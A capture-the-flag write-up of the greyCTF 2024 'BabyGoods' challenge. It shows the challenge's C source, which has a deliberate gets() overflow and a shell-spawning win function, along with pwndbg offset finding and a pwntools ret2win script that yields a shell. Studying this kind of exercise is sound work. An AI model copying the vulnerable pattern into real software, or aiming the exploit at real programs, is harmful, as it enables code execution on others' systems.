---
title: BabyGoods
date: 2024-04-27
tags: 
- pwn
- ROP
- author-fs
categories: greyCTF 2024
---

solved by {% person fs %}

> I have opened a new shop for baby goods! Feel free to explore around :)

We are give some source code for this challenge
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char username[0x20];

int menu(char name[0x20]);

int sub_15210123() {
    execve("/bin/sh", 0, 0);
}

int buildpram() {
    char buf[0x10];
    char size[4];
    int num;

    printf("\nChoose the size of the pram (1-5): ");
    fgets(size,4,stdin);
    size[strcspn(size, "\r\n")] = '\0';
    num = atoi(size);
    if (1 > num || 5 < num) {
        printf("\nInvalid size!\n");
        return 0;
    }

    printf("\nYour pram has been created! Give it a name: ");
    //buffer overflow! user can pop shell directly from here
    gets(buf);
    printf("\nNew pram %s of size %s has been created!\n", buf, size);
    return 0;
}

int exitshop() {
    puts("\nThank you for visiting babygoods!\n");
    exit(0);
}

int menu(char name[0x20]) {
    char input[4];
    do {
        printf("\nHello %s!\n", name);
        printf("Welcome to babygoods, where we provide the best custom baby goods!\nWhat would you like to do today?\n");
        printf("1: Build new pram\n");
        printf("2: Exit\n");
        printf("Input: ");
        fgets(input, 4, stdin);
        input[strcspn(input, "\r\n")] = '\0';
        switch (atoi(input))
        {
        case 1:
            buildpram();
            break;
        default:
            printf("\nInvalid input!\n==========\n");
            menu(name);
        }
    } while (atoi(input) != 2);
    exitshop();
}

int main() {
	setbuf(stdin, 0);
	setbuf(stdout, 0);

    printf("Enter your name: ");
    fgets(username,0x20,stdin);
    username[strcspn(username, "\r\n")] = '\0';
    menu(username);
    return 0;
}
```

It's quite a bit of code but honestly most of it is just a distraction. If we look at the menu() function, we can see that the user is given 2 options. One is to exit and one is to create a new pram. The below function shows how to create a new pram

```c
int buildpram() {
    char buf[0x10];
    char size[4];
    int num;

    printf("\nChoose the size of the pram (1-5): ");
    fgets(size,4,stdin);
    size[strcspn(size, "\r\n")] = '\0';
    num = atoi(size);
    if (1 > num || 5 < num) {
        printf("\nInvalid size!\n");
        return 0;
    }

    printf("\nYour pram has been created! Give it a name: ");
    //buffer overflow! user can pop shell directly from here
    gets(buf);
    printf("\nNew pram %s of size %s has been created!\n", buf, size);
    return 0;
}
```

The user is given the choice to create size of pram and to give it a name. The former option is entirely irrelevant to the challenge because the challenge authors are kind enough to tell us where the vulnerability is and it's in 

```c 
//buffer overflow! user can pop shell directly from here
gets(buf);
```
Why is this vulnerable though? The function gets(some random buffer) in c takes in user input from stdin and parses it to the buffer. Seems simple enough. It's just that this is a pretty stupid idea because nothing stops us from parsing as much input as we want into the buffer and if buffer has a certain set size, our input would overflow the buffer and we can achieve RCE.

```c
int sub_15210123() {
    execve("/bin/sh", 0, 0);
}
```

There is a function that has been written code that contains the RCE part of it. The only part of it that we have to figure out is how to reach this function from build pram. For that, we need to understand **registers**.

As a function executes it's code, there's a very special register called RIP that essentially walks through the code and executes each instruction. When it approaches the end of the function, there's a return instruction and a return memory address (probably to another function) which RIP jumps to and does whatever instructions that function has. When we overflow the buffer, seeing that the buffer is stored in our stack as well, we can overwrite values and registers on our stack and in theory, we could overwrite RIP to whatever memory address we want.

This is the basic principle behind a ret2win attack. 

So, what's our exploitation method?

We need to find the offset to RIP register, craft our payload to reach the size of the offset to RIP register and add in the memory address of sub_15210123(). This would overflow the buffer and  make sure RIP would point to sub_15210123() and jumps to it giving us RCE.

We could use GDB to try stuffing the program with a 100 byte cyclic pattern and get a crash. We can then use the crash to get the offset to the rbp register and just +8 to it to get the offset to $rip. (btw, we use $rbp because it's right before rip and NX is enabled so offset to rip can't be directly calculated)

```
*RDI  0x7fffffffda00 —▸ 0x7fffffffda30 ◂— 'n created!\naaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa of size 1 has beeC_PI'
*RSI  0x7fffffffda30 ◂— 'n created!\naaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa of size 1 has beeC_PI'
*R8   0x73
*R9   0x1
 R10  0x0
*R11  0x202
 R12  0x0
*R13  0x7fffffffdd78 —▸ 0x7fffffffe125 ◂— 'SYSTEMD_EXEC_PID=3254'
*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401200 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffdc18 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x401328 (buildpram+206) ◂— ret 
─────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x401328 <buildpram+206>    ret    <0x6161616161616166>










──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc18 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffdc20 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffdc28 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
03:0018│     0x7fffffffdc30 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
04:0020│     0x7fffffffdc38 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
05:0028│     0x7fffffffdc40 ◂— 'kaaaaaaalaaaaaaamaaa'
06:0030│     0x7fffffffdc48 ◂— 'laaaaaaamaaa'
07:0038│     0x7fffffffdc50 ◂— 0x6161616d /* 'maaa' */
────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401328 buildpram+206
   1 0x6161616161616166
   2 0x6161616161616167
   3 0x6161616161616168
   4 0x6161616161616169
   5 0x616161616161616a
   6 0x616161616161616b
   7 0x616161616161616c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l 'eaaaaaaa'
Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
Found at offset 32
pwndbg> 

```
Looks like our rbp register is at an offset of 32 so our rip register is at the offset of 40. maths

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  puts@plt
0x00000000004010d0  setbuf@plt
0x00000000004010e0  printf@plt
0x00000000004010f0  strcspn@plt
0x0000000000401100  fgets@plt
0x0000000000401110  execve@plt
0x0000000000401120  gets@plt
0x0000000000401130  atoi@plt
0x0000000000401140  exit@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  sub_15210123
0x000000000040125a  buildpram
0x0000000000401329  exitshop
0x000000000040134a  menu
0x0000000000401443  main
0x00000000004014e0  _fini
pwndbg> 

```

We can also see our sub_15210123() (the holy win function) is located at 0x401236. 

Using all the stuff that we just talked about, we can craft a payload like this.

```python
from pwn import *

OFFSET=40
win_function=0x401236

payload=b"A"*40+p64(win_function)

p=process("./babygoods")

p.sendlineafter("Enter your name: ","brokeaf")
p.sendlineafter("Input",b"1")
p.sendlineafter("(1-5): ","1")# literally doesn't matter what number you choose btw
p.sendlineafter("name: ",payload) # the vulnerability woahhhh

p.interactive()
```
```python3 solve.py
[+] Starting local process './babygoods': pid 6241
/home/[REDACTED]/greyctf/pwn/distribution/solve.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter("Enter your name: ","brokeaf")
/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/home/[REDACTED]/greyctf/pwn/distribution/solve.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter("(1-5): ","1")# literally doesn't matter what number you choose btw
[*] Switching to interactive mode

New pram AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\x12@ of size 1 has been created!
$ whoami
root
$  
```

Just like that, we pwned the binary. 

Overall, this challenge is like the very basics of ROP (return-orientated programming) and shows you that gets() is pretty terrible.